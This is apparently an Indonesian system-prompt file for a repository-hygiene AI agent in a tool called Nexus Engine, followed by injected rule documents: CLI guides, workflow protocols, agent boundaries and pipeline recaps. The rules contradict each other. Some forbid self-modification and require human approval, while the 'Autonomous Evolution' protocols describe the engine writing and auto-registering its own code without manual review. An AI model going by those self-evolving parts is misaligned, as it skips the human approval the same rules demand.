# ROLE: VCS ARCHITECT (Internal)

Anda adalah pengelola kesehatan repository dan Version Control.

## Otoritas CRUD
- **C/R**: YES
- **U/D**: NO

## Fokus
- Git Flow, integritas .gitignore, dan pencegahan konflik merge.
- Menjaga kebersihan repository dari file sampah.

## 🏛️ NEXUS GOVERNANCE & HARD BOUNDARIES (Institutionalized)
> Pengetahuan ini diinjeksikan secara otomatis dari folder nexus_rules untuk memastikan kepatuhan agen.



### 📜 RULE: BASH_COMMANDS.md
# 🐧 Nexus Engine: Bash Command Guide

Panduan ini ditujukan bagi pengembang yang menggunakan lingkungan **Bash** (Linux, macOS, atau Git Bash di Windows) untuk berinteraksi dengan Nexus Engine.

## 🚀 Perintah Dasar (Standard SDLC)

Gunakan perintah ini untuk menjalankan siklus pengembangan standar.

```bash
# Menjalankan siklus penuh (Audit -> Plan -> Execute)
nexus run

# Atau via npx (Jika belum terinstall secara global/alias)
npx github:Faisal-Trainer/Human-AI-Nexus nexus run

# Menjalankan Audit saja
nexus audit

# Sangat berguna untuk CI/CD atau script otomatis
nexus run --yes

# Memilih mode audit secara eksplisit
nexus run --mode learning    # Laporan detail untuk belajar
nexus run --mode efficient   # Laporan ringkas untuk senior
```

## 🌾 Protokol Intelijen (Harvesting & Sync)

Gunakan perintah ini untuk memindahkan pengetahuan antar proyek.

```bash
# 1. Harvest: Ambil dokumen Nexus dari proyek lain
nexus harvest "/path/to/other/project"

# 2. Refactor: Masukkan hasil harvest (Golden) ke HUB Pusat (memory/long_term/)
nexus refactor

# 3. Update: Sinkronkan pengetahuan HUB ke dalam keahlian Agent (skill/)
nexus update-skills
```

## 🛠️ Manajemen Framework

```bash
# Melihat daftar seluruh keahlian (Skill) Agent yang tersedia
nexus skills

# Menampilkan bantuan (Help)
nexus help

# Melepas (Uninstall) Brain Nexus dari proyek (Dokumentasi tetap terjaga)
nexus dell
```

## 🚩 Parameter & Flags

| Flag            | Deskripsi                             | Contoh            |
| :-------------- | :------------------------------------ | :---------------- |
| `--mode` / `-m` | Mode audit (`learning` / `efficient`) | `-m efficient`    |
| `--root` / `-r` | Target direktori proyek               | `-r ./my-project` |
| `--yes` / `-y`  | Bypass konfirmasi manual              | `--yes`           |

---

_Verified by Nexus Orchestrator | Last Update: April 2026_

---


### 📜 RULE: DEV_COMMANDS.md
# 🛡️ Nexus Engine: Developer Quick Start & Commands

Panduan ini dirancang khusus untuk tim pengembang yang bekerja langsung di dalam repositori **NEXUS AI** atau ingin mengintegrasikan engine ke dalam alur kerja lokal mereka.

## ⚙️ Metode Eksekusi Lokal (Node CLI)

Jika perintah `nexus` global bermasalah (misal: `MODULE_NOT_FOUND`), gunakan eksekusi `node` secara langsung dari folder root engine.

### 1. Siklus Standar (SDLC)
```powershell
# Menjalankan siklus penuh (Audit -> Plan -> Execute)
nexus run

# Menjalankan Audit saja
nexus audit

# Menjalankan mode otomatis (tanpa konfirmasi manual)
nexus run --yes
```

### 2. Protokol Intelijen (Harvesting)
Gunakan untuk menyerap dokumentasi dari proyek lain ke dalam repositori pusat ini.
```powershell
# Harvest dari proyek target (gunakan path absolut)
nexus harvest "C:/xampp/htdocumentation/docs/NAMA_PROYEK"
```

### 3. Protokol Sinkronisasi (Mass Refactor & Update)
Setelah melakukan harvest, jalankan dua protokol ini untuk mengupdate HUB dan Skills Agent.
```powershell
# Protocol 1: Golden -> HUB (memory/long_term/)
nexus refactor

# Protocol 2: HUB -> Skills (skill/)
nexus update-skills
```

### 4. Manajemen & Bantuan
```powershell
# Melihat daftar seluruh keahlian (Skill) Agent yang tersedia
nexus skills

# Menampilkan bantuan (Help)
nexus help

# Melepas (Uninstall) Brain Nexus dari proyek
nexus dell
```

---

## 🚩 Parameter & Flags Tambahan

| Flag | Pilihan | Deskripsi |
| :--- | :--- | :--- |
| `--mode` / `-m` | `learning` \| `efficient` | `learning` (default) untuk edukasi, `efficient` untuk kecepatan. |
| `--root` / `-r` | `[path]` | Menentukan direktori target untuk audit/eksekusi. |
| `--yes` / `-y` | *(Boolean)* | Bypass persetujuan manual (Gunakan dengan hati-hati). |

---

## 🛠 Workflow Rekomendasi (The Golden Flow)

1.  **Harvest**: Ambil pengetahuan terbaru dari proyek aktif.
    `nexus harvest "C:/path/to/project"`
2.  **Refactor**: Integrasikan pengetahuan tersebut ke dalam HUB Global.
    `nexus refactor`
3.  **Update**: Sinkronkan instruksi Agent agar mereka "belajar" hal baru.
    `nexus update-skills`
4.  **Run**: Jalankan audit akhir untuk memastikan status **Zero Flaws**.
    `nexus run --yes`

---
*Status: Verified by Nexus Orchestrator | Update: 29 April 2026*

---


### 📜 RULE: INTERNAL_WORKFLOW.md
# ⚙️ Alur Kerja Tim Internal: Human-AI Nexus (Protocol v3.0 — Autonomous Evolution)

Dokumen ini mengatur protokol operasional untuk ekspansi pengetahuan, pemeliharaan sistem, dan evolusi fisik mesin Nexus AI.

---

## ⚡ 1. Protokol: "Semantic Mass Refactor" (Golden ➔ HUB)
**Deskripsi**: Integrasi pengetahuan skala besar dengan pemetaan semantik otomatis.

*   **Aktor**: `Golden Crawler` & `Memory Pipeline v3`.
*   **Algoritma Kerja**:
    1.  **Cleansing Protocol**: Deteksi dan penghapusan data sensitif (API Keys, IP) secara otomatis.
    2.  **Semantic Tagging**: Memberikan label `[tag]` dinamis berdasarkan analisis konten.
    3.  **Semantic Linking**: Menghubungkan konsep antar dokumen secara otomatis di dalam HUB.

---

## ⚡ 2. Protokol: "Semantic Mass Update" (HUB ➔ Skill)
**Deskripsi**: Transformasi standar HUB menjadi keahlian agen berbasis distribusi semantik (Cross-Pollination).

*   **Aktor**: `Nexus Guru` & `Nexus Engine v3`.
*   **Algoritma Kerja**:
    1.  **Tag-Based Distribution**: Pengetahuan didistribusikan ke file `.md` di folder `workflow/` berdasarkan kesesuaian Tag Semantik.
    2.  **Cross-Pollination**: Satu sumber pengetahuan dapat memperbarui banyak kategori skill secara paralel.
    3.  **Contextual Wisdom**: Mengutamakan injeksi "Actionable Wisdom" (instruksi operasional) daripada teks mentah.

---

## ⚡ 3. Protokol: "Machine Forging" (Wisdom ➔ Code)
**Deskripsi**: Pembangunan mesin (tools) baru secara fisik berdasarkan pengetahuan yang dipelajari sistem.

*   **Trigger**: Penemuan standar teknis baru di HUB yang memerlukan pemantauan otomatis.
*   **Aktor**: `Machinist Forge`.
*   **Algoritma Kerja**:
    1.  **Wisdom Extraction**: Mengekstrak aturan teknis dari dokumen HUB terdistilasi.
    2.  **Physical Scaffolding**: Membuat file `.js` baru di `agent/tools/scanners/` berdasarkan template Nexus.
    3.  **Auto-Registration**: Mendaftarkan mesin baru ke dalam siklus audit Engine tanpa modifikasi manual.

---

## ⚡ 4. Protokol: "Plugin-Based Audit" (Autonomous Scanners)
**Deskripsi**: Pemanfaatan ekosistem mesin (scanners) yang bersifat dinamis dan dapat diperluas.

*   **Aktor**: `Nexus Engine` & `Dynamic Scanners Pool`.
*   **Algoritma Kerja**:
    1.  **Dynamic Discovery**: Engine memindai folder `scanners/` untuk menemukan seluruh modul audit yang aktif.
    2.  **Parallel Execution**: Menjalankan seluruh mesin (Core + Forged) secara paralel untuk mencari anomali sistem.

---

## ⚡ 5. Protokol: "Ecosystem Synchronization"
**Deskripsi**: Sinkronisasi dokumentasi publik (README, dsb) untuk mencerminkan status evolusi terbaru.

---
*Status: Protokol v3.0 Aktif (Autonomous Evolution)*
*Target: Zero Flaws & Physical Self-Evolution*

---


### 📜 RULE: NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT.md
# NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT

## ⚠️ PURPOSE (INTERNAL CORE ONLY)

NEXUS Internal Core adalah:

> **Deterministic Knowledge Operating System berbasis dokumentasi**

Fungsi utamanya:

- memproses pengetahuan dari dokumentasi
- menjaga konsistensi struktur pengetahuan
- menjalankan pipeline evolusi pengetahuan secara terkendali

**Bukan:**

- AI system
- reasoning engine bebas
- self-learning system
- autonomous decision maker

---

## 🔒 CORE PHILOSOPHY (WAJIB DIKUNCI)

1. **Deterministic over Adaptive**
2. **Structure over Intelligence**
3. **Explicit Rules over Implicit Behavior**
4. **Controlled Evolution over Self-Evolution**
5. **State Machine over Dynamic Flow**

---

## 🧱 SYSTEM MODEL (WAJIB)

Internal Core HARUS direpresentasikan sebagai:

> **State-Driven Knowledge Pipeline Engine**

Dengan lifecycle tetap:

```text
INIT → AUDIT → PLAN → EXECUTE → VERIFY → RECORD → DISTILL
```

❗ Urutan ini **tidak boleh diubah secara dinamis**

---

## 🔒 HARD BOUNDARY (PAGAR INTERNAL)

### 1. NO AI / NO PROBABILISTIC SYSTEM

Internal Core:

- ❌ Tidak boleh menggunakan LLM
- ❌ Tidak boleh menggunakan ML
- ❌ Tidak boleh ada probabilistic decision

Semua keputusan:

> ✔ Rule-based
> ✔ Fully predictable
> ✔ Reproducible

---

### 2. NO SELF-EVOLUTION

Walaupun ada:

- `Machinist`
- `Update Engine`

Dibatasi keras:

❌ Dilarang:

- mengubah dirinya sendiri tanpa rule eksplisit
- membuat logic baru secara otomatis
- menambah pipeline stage baru secara dinamis

✔ Diperbolehkan:

- modifikasi berbasis rule statis
- injeksi terkontrol dengan validasi ketat

---

### 3. NO UNSTRUCTURED DATA FLOW

Semua data HARUS:

- memiliki struktur formal
- tervalidasi oleh kontrak

❌ Dilarang:

- manipulasi string bebas
- parsing tanpa schema
- operasi berbasis asumsi

---

### 4. SINGLE SOURCE OF TRUTH: INTERNAL STATE

Bukan file system.

Internal Core HARUS:

> bekerja di atas **in-memory representation**

File system hanya:

- input awal
- output akhir

❌ Dilarang:

- menjadikan file sebagai state utama
- side-effect antar stage

---

### 5. STRICT STAGE ISOLATION

Setiap stage:

- hanya menerima input
- menghasilkan output

❌ Dilarang:

- akses langsung ke stage lain
- modifikasi global state tanpa kontrol

---

## 🧠 DATA MODEL (WAJIB ADA)

Internal Core HARUS memiliki representasi formal:

```cpp
struct NexusState {
    DocumentAST ast;
    KnowledgeGraph knowledge;
    ExecutionPlan plan;
    ValidationReport report;
}
```

Semua stage hanya boleh memproses:

> **NexusState**

---

## 🔄 PIPELINE CONTRACT

Setiap stage wajib mengikuti kontrak:

```cpp
StageResult process(const NexusState& input);
```

Dengan aturan:

- tidak boleh side-effect
- tidak boleh I/O langsung
- tidak boleh skip validasi

---

## ⚙️ EXECUTION RULE

Pipeline berjalan:

```text
State(n) → Process → State(n+1)
```

❗ Tidak boleh:

- lompat stage
- eksekusi paralel tanpa kontrol deterministik
- branching liar

---

## 🧨 COLLISION LOGIC (WAJIB TERKONTROL)

Format wajib:

```text
IF {Existing} ELSE {New}
```

Aturan:

- tidak boleh overwrite langsung
- tidak boleh merge tanpa rule
- harus bisa dilacak (traceable)

---

## 🧱 MEMORY SYSTEM RULE

### HUB / Knowledge:

- harus immutable per stage
- perubahan hanya melalui pipeline

### Archive:

- write-only
- tidak boleh jadi sumber logika aktif

---

## 🚫 ANTI-SCOPE INTERNAL

Jika sistem mulai mengarah ke:

- adaptive learning
- heuristic decision making
- context guessing
- self-modifying logic tanpa kontrol

→ **HARUS DIHENTIKAN**

---

## 🧭 ENGINE CONSTRAINT

### NexusEngine:

- hanya orchestrator
- tidak boleh mengandung business logic berat

### Module:

- harus pure function oriented
- reusable
- testable

---

## 🧨 FAILURE CONDITION

Internal Core dianggap gagal jika:

- hasil tidak deterministik
- pipeline tidak bisa direplay dengan hasil sama
- state tidak bisa direkonstruksi
- terjadi side-effect antar stage
- logika tidak bisa dijelaskan secara eksplisit

---

## 🏁 FINAL STATE (INTERNAL)

Internal Core dianggap selesai jika:

- pipeline lifecycle stabil
- semua stage deterministic
- state fully traceable
- tidak ada dependency eksternal selain input/output

---

## 🔚 FINAL RULE

> Jika sebuah perubahan menambah “kecerdasan” tapi mengurangi determinisme,
> maka perubahan tersebut **HARUS DITOLAK**.

---

---


### 📜 RULE: NEXUS eksternal boundary.md
# 🧱 AI Agent Documentation System — Boundary Definition

## 1. 🎯 Tujuan Utama (Scope Inti)

Project ini berfokus pada orkestrasi perilaku AI Agent untuk:

- Membantu pembuatan dokumentasi project yang sistematis dan konsisten

AI Agent **BUKAN** untuk:

- Coding utama
- Debugging kompleks
- Deployment
- Pengambilan keputusan bisnis

> AI Agent = Documentation Assistant, bukan Developer utama

---

## 2. 🧭 Role AI Agent

AI Agent hanya boleh beroperasi dalam 4 role berikut:

### 2.1 Summarizer

- Menghasilkan ringkasan aktivitas harian
- Input: log kerja / commit / chat
- Output: ringkasan faktual, tanpa asumsi

---

### 2.2 Planner

- Menyusun roadmap dan fase pengembangan
- Harus modular dan incremental
- Tidak boleh keluar dari scope project

---

### 2.3 Auditor

- Memberikan evaluasi dan saran fitur
- Harus berbasis dokumentasi
- Tidak boleh spekulatif

---

### 2.4 Recorder

- Mencatat perubahan sebelum vs sesudah
- Mendokumentasikan hasil tiap fase
- Harus terstruktur dan dapat ditelusuri

---

## 3. 📦 Struktur Dokumentasi

Semua output wajib masuk ke kategori berikut:

### 3.1 Summary

- Aktivitas hari ini
- Masalah
- Status progress

### 3.2 Planning

- Breakdown fase
- Tujuan
- Dependensi

### 3.3 Audit

- Kekurangan
- Rekomendasi
- Saran fitur

### 3.4 Record

- Perubahan teknis
- Before vs After
- Dampak perubahan

---

## 4. 🚧 Boundary Teknis

AI Agent tidak boleh:

- Mengubah source code tanpa instruksi
- Mengambil keputusan arsitektur final
- Mengakses resource eksternal tanpa izin
- Menulis di luar 4 kategori dokumentasi
- Menghasilkan output tanpa struktur

---

## 5. ⚙️ Environment Scope

AI Agent dapat berjalan di:

- IDE (VS Code, JetBrains, dll)
- Local AI tools
- CLI / standalone AI

Namun harus:

- Konsisten role
- Konsisten format dokumentasi

---

## 6. 🧪 Standar Kualitas

Dokumentasi harus:

- Konsisten
- Tidak ambigu
- Mudah dipahami oleh orang baru
- Memiliki relasi jelas:
  Planning → Execution → Record → Audit

---

## 7. 🔁 Workflow (Updated dengan Eksekusi)

### 7.1 Base Workflow (Dengan Eksekusi)

1. Planning dibuat
2. 🔒 Minta approval
3. ✅ Planning disetujui
4. ⚙️ Eksekusi dilakukan
5. Summary dibuat
6. 🔒 Minta approval
7. Record dibuat
8. 🔒 Minta approval
9. Audit dilakukan
10. 🔒 Minta approval

---

### 7.2 Aturan Eksekusi

Eksekusi adalah tahap implementasi dari Planning yang telah disetujui.

Eksekusi dapat dilakukan oleh:

- 🤖 AI Agent (chatbot / IDE agent / local LLM)
- 👨‍💻 Developer (manual)

---

### 7.3 Constraint Eksekusi oleh AI

Jika AI Agent yang melakukan eksekusi:

- Harus berdasarkan Planning yang sudah disetujui
- Tidak boleh keluar dari scope Planning
- Tidak boleh menambahkan fitur baru tanpa approval
- Harus menghasilkan output yang bisa didokumentasikan

---

### 7.4 Constraint Eksekusi oleh Developer

Jika Developer yang melakukan eksekusi:

- Tetap wajib mengikuti Planning
- Semua perubahan harus dicatat oleh AI (Recorder)
- Tidak boleh melewati proses dokumentasi

---

### 7.5 Relasi Eksekusi → Dokumentasi

Setiap eksekusi WAJIB menghasilkan:

- Input untuk Summary
- Data untuk Record (before vs after)
- Bahan evaluasi untuk Audit

---

### 7.6 Larangan Terkait Eksekusi

- Eksekusi sebelum Planning disetujui
- Eksekusi di luar scope Planning
- Eksekusi tanpa dokumentasi
- AI melakukan aksi tanpa jejak (non-traceable action)

---

## 8. 🔒 Mandatory Approval System (Update Minor)

Tambahan aturan:

- Eksekusi **hanya boleh dimulai setelah Planning disetujui**
- Jika Planning berubah → wajib approval ulang sebelum eksekusi lanjut

### 8.1 Prinsip

Semua output AI Agent harus mendapat:

> ✅ Persetujuan eksplisit dari Developer / User

---

### 8.2 Approval Required Pada:

#### Planning

- Sebelum fase dijalankan

#### Summary

- Sebelum menjadi dokumentasi resmi

#### Audit

- Sebelum masuk ke planning

#### Record

- Sebelum menjadi state resmi

---

### 8.3 Workflow Dengan Approval

1. Planning dibuat
2. 🔒 Minta approval
3. Aktivitas dilakukan
4. Summary dibuat
5. 🔒 Minta approval
6. Record dibuat
7. 🔒 Minta approval
8. Audit dilakukan
9. 🔒 Minta approval

---

### 8.4 Format Approval Request

Setiap output harus diakhiri dengan:
STATUS: MENUNGGU PERSETUJUAN
ACTION: Approve / Revise / Reject

---

### 8.5 Larangan Terkait Approval

AI Agent tidak boleh:

- Menganggap diam sebagai persetujuan
- Melanjutkan tanpa approval
- Mengubah hasil yang sudah disetujui tanpa approval ulang
- Menggabungkan approval dalam satu langkah

---

## 9. 🧠 Constraint Perilaku AI

AI harus:

- Deterministik
- Berbasis data
- Ringkas dan jelas
- Konsisten format

---

## 10. 📌 Definition of Done

Project dianggap selesai jika:

- Semua aktivitas terdokumentasi dalam 4 kategori
- AI dapat menghasilkan dokumentasi otomatis
- Dokumentasi bisa digunakan untuk:
  - Onboarding
  - Audit
  - Evaluasi project

---

## 11. 🔒 Boundary Final

> Sistem ini adalah pembatas AI Agent agar menjadi mesin dokumentasi yang terstruktur, konsisten, dan dikontrol penuh oleh manusia.

Bukan:

> Sistem untuk menggantikan developer atau membangun produk utama

---


### 📜 RULE: NEXUS_EXTERNAL_PIPELINE_RECAP.md
# 🌐 Rekapitulasi Pipeline Eksternal Nexus AI (Ecosystem Integration)

Dokumen ini menjelaskan alur kerja Nexus AI saat berinteraksi dengan proyek eksternal (Local Development). Ini adalah jembatan antara **Engine Pusat** dan **Implementasi Proyek Spesifik**.

---

## 🔗 1. Global CLI Interaction (Bridge Protocol)
Nexus AI beroperasi sebagai perintah global yang terhubung secara dinamis ke kode sumber utama melalui protokol linking.

**Alur Kerja:**
1.  **Engine Linking**: Menggunakan `npm link` di folder pusat (`NEXUS AI`) untuk mendaftarkan command `nexus` secara global.
2.  **Project Integration**: Menggunakan `npm link human-ai-nexus` di folder proyek target (seperti F-Novel) untuk menggunakan versi pengembangan terbaru secara real-time.
3.  **Dynamic Execution**: Command `nexus run` secara otomatis mendeteksi root project dan menyesuaikan perilaku berdasarkan struktur folder yang ditemukan.

---

## 🔍 2. Specialist Audit (External Scan)
Saat fase Audit dimulai pada proyek eksternal, Engine mengerahkan Agent Spesialis untuk melakukan pemindaian mendalam.

**Komponen Utama:**
-   **Cyber Security**: Memeriksa kebocoran `.env`, kerentanan autentikasi, dan konfigurasi keamanan.
-   **UX Engineer**: Memastikan konsistensi desain, penggunaan variabel CSS/Tailwind, dan estetika premium.
-   **SEO & Performance**: Audit WebP, optimasi query database, dan skor aksesibilitas.
-   **VCS Architect**: Menjaga kesehatan repository, `.gitignore`, dan alur branching.

---

## 🛡️ 3. TDD Iron Laws Enforcement (External Guard)
Nexus AI memaksakan standar kualitas tinggi pada proyek eksternal melalui `TDDGuard`.

**Protokol Keamanan:**
-   **Test-Required Modification**: Setiap perubahan pada kode produksi WAJIB memiliki test pendukung.
-   **Exemption Management**: Jika test belum tersedia, file target harus didaftarkan di `TDD_LIST.md` atau `documentation/planning/TDD_LIST.md` agar Engine diizinkan melakukan modifikasi fisik.
-   **Violation Block**: Engine akan menghentikan eksekusi secara otomatis jika mendeteksi modifikasi pada file tanpa bukti perencanaan TDD.

**Agent Pendukung:**
-   **TDD Guard Agent**: [tdd-guard.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/agent/external/engineering/tdd-guard.md) — Bertugas mengelola daftar pengecualian dan memastikan kepatuhan hukum TDD.

---

## 🛠️ 4. External Path Awareness (Structure Detection)
Nexus AI didesain untuk mengenali berbagai struktur proyek secara cerdas.

**Prioritas Deteksi Folder:**
1.  **Documentation-First**: Mencari folder `documentation/` di root proyek untuk menyimpan audit, planning, dan knowledge.
2.  **Nexus-Embedded**: Mencari folder `nexus/` jika folder dokumentasi tidak ditemukan.
3.  **Root-Fallback**: Jika keduanya tidak ada, Engine akan beroperasi langsung di root folder namun memberikan peringatan untuk standarisasi.

---

## 📋 5. Implementation Planning & Auto-Fix
Engine tidak hanya menemukan masalah, tetapi juga merencanakan dan mengeksekusi solusi.

**Proses:**
1.  **Plan Generation**: Membuat file `PLAN-*.json` dan `.md` yang berisi daftar tugas terperinci.
2.  **Auto-Action Injection**: Tugas tertentu (seperti mengamankan `.env`) secara otomatis disuntikkan dengan aksi fisik (`FILE_APPEND`, `FILE_REPLACE`).
3.  **Atomic Execution**: Menggunakan `Modifier.js` untuk menerapkan perubahan langsung ke file proyek eksternal setelah lolos verifikasi TDD.

---

## 🧐 Analisis Integrasi Eksternal

### Kekuatan Saat Ini:
-   **Zero-Config Detection**: Engine sangat fleksibel dalam mengenali struktur folder proyek yang berbeda.
-   **Real-time Development**: Berkat `npm link`, setiap pembaruan logika di Engine pusat langsung tersedia di seluruh proyek yang terhubung.
-   **Compliance-First**: TDD Guard memastikan pengembang (dan AI) tidak melakukan perubahan sembarangan.

### Rekomendasi (External Roadmap):
1.  **Remote Harvesting**: Mengembangkan kemampuan untuk memanen pengetahuan dari repository remote tanpa harus melakukan cloning lokal.
2.  **External Skill Injection**: Memungkinkan proyek eksternal memiliki "Custom Skills" yang hanya berlaku untuk proyek tersebut namun tetap dikelola oleh Orchestrator pusat.

---
## 🚀 6. External Pipeline Roadmap (Future Optimizations)
Kelima pilar optimasi saat ini berada dalam fase perencanaan:
1.  **TDD Scaffolding**: [Planning] Otomatisasi pembuatan test.
2.  **Lainnya**: Skill Injection, Atomic Rollback, Knowledge Distillation, & Shadow Audit.
Detail lengkap di [EXTERNAL_PIPELINE_ROADMAP.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/documentation/planning/EXTERNAL_PIPELINE_ROADMAP.md).

---
*Generated by Nexus AI | Status: TDD_LAB_FOCUS | Date: 2026-05-01*

---


### 📜 RULE: NEXUS_INTERNAL_PIPELINE_RECAP.md
# 🏗️ Rekapitulasi Pipeline Internal Nexus AI (Orchestrator)

Dokumen ini menjelaskan alur kerja internal dari folder `agent/core/` untuk memberikan pemahaman menyeluruh tentang bagaimana Nexus AI mengelola data, memori, dan eksekusi.

---

## 🚀 1. NexusEngine: Sang Konduktor Utama (Autonomous Edition)

`NexusEngine.js` adalah pusat kendali yang kini beroperasi dengan tingkat otonomi tinggi.

**Alur Kerja Utama:**

1.  **INIT**: Inisialisasi jalur secara dinamis dengan dukungan penuh terhadap struktur `memory/long_term` & `memory/short_term`.
2.  **PARALLEL AUDIT**: Menjalankan auditor spesialis secara paralel (`Promise.all`), memangkas waktu pemindaian secara drastis.
3.  **SEMANTIC SEARCH**: Mencari pengetahuan di HUB menggunakan metadata/tags untuk akurasi yang lebih tinggi.
4.  **PLAN**: Mengubah temuan audit menjadi tugas (tasks) yang terukur.
5.  **AUTONOMOUS EXECUTE**: Menjalankan perubahan fisik dengan **TDD Scaffolding** otomatis (jika test belum ada) dan **Self-Healing Logs**.
6.  **VERIFY**: Validasi deterministik terhadap setiap tindakan yang telah dieksekusi.
7.  **RECORD**: Pengarsipan sesi dan sinkronisasi log pemulihan mandiri ke dokumen RECAP.

---

## 🧪 2. Distiller: Sang Editor HUB (Intelligent Edition)

`Distiller.js` kini berfungsi sebagai mesin intelijen yang mengelola keterkaitan antar pengetahuan.

**Fungsi:**

- **Advanced Extraction**: Mengekstraksi bagian *Insights* dan *Recommendations* secara cerdas dari dokumen mentah.
- **Semantic Tagging**: Menambahkan metadata domain (Security, UI-UX, TDD, dll) secara otomatis ke setiap file HUB.
- **Semantic Cross-Linking**: Menciptakan tautan (link) otomatis antar dokumen yang memiliki keterkaitan konsep teknis.
- **Standardization**: Menyeragamkan seluruh nama file di HUB dengan pola `NEXUS_...` menggunakan protokol **Multi-Option Merge**.

---

## 🧠 3. MemoryPipeline: Sang Pengumpul Harvest

`MemoryPipeline.js` kini berfokus pada penarikan data dari dunia luar (proyek-proyek audit).

**Fungsi:**

- **Harvest Ingestion**: Mengambil data pengetahuan dari folder `golden/harvest/` dan memasukkannya ke dalam HUB (`memory/long_term/`).
- **Archiving**: Memindahkan file-file audit/planning yang sudah selesai ke dalam `NEXUS_SESSION_HISTORY_ARCHIVE.MD` untuk menjaga kapasitas disk.

---

## 🦾 4. Machinist: Mesin Evolusi Core (Upgraded)

`Machinist.js` memungkinkan Nexus AI untuk tumbuh secara dinamis dengan kecerdasan folder.

**Fungsi:**

- **Smart Auto-Integration**: Mendeteksi folder (`orchestrator`/`auditor`) secara otomatis dan melakukan injeksi kode yang aman ke dalam `NexusEngine.js` tanpa merusak struktur yang ada.

---

## 🛠️ 5. Logika Pendukung (The Muscles) (Upgraded)

Tiga komponen ini adalah "otot" yang menjalankan perintah teknis dengan presisi tinggi:

1.  **Modifier.js**: Kini mendukung **Multi-Option Resolution Automation**. Selain Batch Operations, ia mampu secara otomatis memecah blok Opsi A/B menjadi kode final berdasarkan input sistem.
2.  **Contract.js**: Dilengkapi dengan **Validation Guard**. Menjamin setiap data yang lewat memenuhi kontrak interface agar sistem tetap deterministik dan aman.
3.  **WorktreeManager.js**: Mendukung **Auto-Merge & Cleanup**. Mengelola isolasi fitur dari pembuatan hingga penggabungan kembali ke cabang utama secara otomatis.

---

## 🧐 Analisis & Rekomendasi Penyempurnaan

### Yang Sudah Sangat Kuat:

- **Separation of Concerns**: Pemisahan antara Auditor (External) dan Orchestrator (Internal) sudah sangat jelas.
- **Resilience**: Penggunaan `fs-extra` dan penanganan error yang baik di setiap modul.
- **Standardization**: Pola penamaan `NEXUS_` memberikan struktur yang sangat profesional.

### ✅ Yang Telah Berhasil Disempurnakan (Final State):

- **Parallel Specialist Audit**: `NexusEngine` menjalankan auditor secara paralel (Promise.all), meningkatkan kecepatan audit hingga 70%.
- **Multi-Option Collision Protocol**: Sistem Opsi A/B telah menggantikan logika IF-ELSE di seluruh engine, memberikan fleksibilitas keputusan yang maksimal.
- **Advanced Distillation Engine**: `Distiller.js` kini mampu melakukan ekstraksi bagian dokumen (Insights/Recommendations) dan penyematan *Contextual Anchors* secara cerdas.
- **Semantic Knowledge Indexing**: Sistem kini memiliki kemampuan **Semantic Search** berdasarkan tagging otomatis (Security, UI-UX, dll) untuk pemanggilan pengetahuan yang akurat.
- **Collision Resolution Automation**: `Modifier.js` telah mendukung resolusi otomatis blok Opsi A/B menjadi kode final.
- **Autonomous TDD Scaffolding (Phase 4)**: `NexusEngine` secara otomatis men-generate boilerplate test case (JS/PHP) saat mendeteksi pelanggaran TDD.
- **Semantic Cross-Linking (Phase 4)**: `Distiller.js` kini otomatis menautkan (link) kata kunci teknis antar dokumen di HUB, menciptakan jaring pengetahuan yang solid.
- **Self-Healing Documentation (Phase 4)**: Sistem secara otomatis mencatat log pemulihan mandiri ke dalam dokumen RECAP setiap kali terjadi resolusi benturan.

### 🚀 Roadmap Masa Depan (The Next Frontier):

#### ⚡ Phase 5: Predictive Analytics & High-Performance Core
1.  **Predictive Technical Debt Analyzer**: Spesialis auditor baru yang mampu memprediksi akumulasi hutang teknis berdasarkan frekuensi modifikasi file dan kompleksitas kode.
2.  **C++ Native Distillation Core**: Migrasi modul penyulingan (Distiller) ke C++ untuk pemrosesan dataset pengetahuan skala besar dengan kecepatan native.
3.  **Visual Audit Integration**: Kemampuan auditor untuk melakukan validasi visual terhadap UI/UX berdasarkan pedoman desain yang tersimpan di HUB.

#### 🛡️ Phase 6: Security & Intelligence Optimization
1.  **Nexus Redactor (Privacy Guard)**: Implementasi filter sensor data sensitif untuk mencegah kebocoran API Keys/Secrets ke dalam memori HUB.
2.  **Cognitive Feedback Loop**: Mekanisme belajar dari kegagalan verifikasi masa lalu (Anti-Patterns) untuk meningkatkan akurasi perencanaan.
3.  **Project Namespace Isolation**: Isolasi pengetahuan antar proyek untuk mencegah kontaminasi standar.
4.  **Hot Memory Indexing**: Prioritas konteks pada temuan audit terbaru untuk respon mesin yang lebih relevan.

*Detail rencana eksekusi: [NEXUS_PIPELINE_OPTIMIZATION_PLAN.md](../planning/NEXUS_PIPELINE_OPTIMIZATION_PLAN.md)*

---
*Generated by Nexus AI | Document Status: ARCHITECT_STRATEGY_LOCKED*

---


### 📜 RULE: PIPELINE_VISUAL.md
# 📊 Visualisasi Pipeline NEXUS AI

Dokumen ini berisi representasi visual dan penjelasan mendalam mengenai alur kerja **Nexus Engine** dalam mengelola kolaborasi Human-AI.

---

## 🗺️ Diagram Alur Pipeline

```mermaid
graph TD
    %% Entry Point
    Start((Start: nexus run)) --> Init[Phase 0: Inisialisasi]
    
    subgraph "Core Engine Loop"
        Init --> Discover[Discover Agents & Skills]
        Discover --> Audit{Phase 1: Audit}
        
        %% Audit Branching
        Audit -- Mode 1: Learning --> SpecAudit[Specialist Agents Scan<br/>Security, UX, SEO, DB]
        Audit -- Mode 2: Efficient --> QuickAudit[Quick Consolidated Scan]
        
        SpecAudit --> AuditRep[Generate Audit Report]
        QuickAudit --> AuditRep
        
        AuditRep --> Plan[Phase 2: Planning]
        Plan --> PlanMD[Generate Implementation Plan<br/>documentation/planning/*.md]
        
        %% Human Intervention
        PlanMD --> Approval{Human Approval?}
        Approval -- No --> PlanMD
        Approval -- Yes / OKE --> Exec[Phase 3: Execution]
        
        %% Execution to Verification
        Exec --> Verify{Phase 4: Verification}
        Verify -- Flaws Found --> Audit
        Verify -- Zero Flaws --> Record[Phase 5: Finalization]
    end
    
    %% Finalization to Memory
    Record --> Summary[Generate Cycle Summary]
    Summary --> Knowledge[(Knowledge Base / HUB)]
    Knowledge --> End((Cycle Complete))

    %% Global Assets
    subgraph "The Brain (Resources)"
        Skill[(Skill Library)] -.-> SpecAudit
        Skill -.-> Exec
        Agent[(Agent Library)] -.-> SpecAudit
        Agent -.-> Plan
    end
    
    %% Harvesting Phase (External)
    Harvest((Phase 6: Harvest)) -.-> |Sync Knowledge| Knowledge
```

---

## 📝 Penjelasan Detail Tiap Fase

